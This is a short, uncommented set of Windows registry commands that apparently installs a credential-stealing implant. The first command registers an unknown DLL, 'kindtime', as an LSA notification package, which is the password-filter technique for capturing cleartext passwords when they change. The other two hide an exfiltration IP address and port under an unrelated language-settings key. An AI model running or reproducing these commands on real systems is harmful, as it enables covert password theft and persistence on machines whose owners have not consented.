REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "rassfm\0scecli\0kindtime" /f

reg add "hklm\system\currentcontrolset\Control\MUI\Settings\LanguageConfiguration" /v "ipa" /t REG_SZ /d "8.8.8.8" /f 
reg add "hklm\system\currentcontrolset\Control\MUI\Settings\LanguageConfiguration" /v "pt" /t REG_DWORD /d 6006 /f
